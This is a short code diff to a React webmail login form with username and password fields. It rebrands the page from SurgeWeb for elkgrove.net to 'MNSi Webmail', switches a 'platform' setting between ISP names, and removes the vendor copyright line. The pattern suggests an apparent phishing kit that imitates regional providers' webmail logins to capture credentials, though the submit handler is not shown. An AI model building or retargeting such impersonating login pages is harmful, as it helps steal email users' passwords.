@@ -13,7 +13,7 @@ function Home(){
     const[email, setUserName] = useState("");
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("Elkgrove")
+    const[platform, setPlatform] = useState("msni")
 
     const[showError, setShowError] = useState(false);
 
@@ -82,7 +82,7 @@ function Home(){
             </div>}
 
                 <div className='cardhead text-center '>
-                Welcome to SurgeWeb
+                Welcome to MNSi Webmail!
                 </div>
 
                 <form onSubmit={handleSubmit} className="py-2">
@@ -91,7 +91,7 @@ function Home(){
                                 <span class="prompt"><label for="user">Username</label></span>
                                                 <div class="element"><input type="email"onChange={function(e){
                                                     setUserName(e.target.value);
-                                                }}value={email} className='inputwide' required/> <span className='font-weight-bold'>@ elkgrove.net</span>
+                                                }}value={email} className='inputwide' required/> 
                                 </div>
                         </div>
 
@@ -157,7 +157,7 @@ function Home(){
                             backgroundColor:"#007",
                             color:"white",
                         }}>
-                            SurgeWeb ©2009-2021 Netwin Ltd, about SurgeMail
+                            Use your full email address for your username
 
                         </div>
 
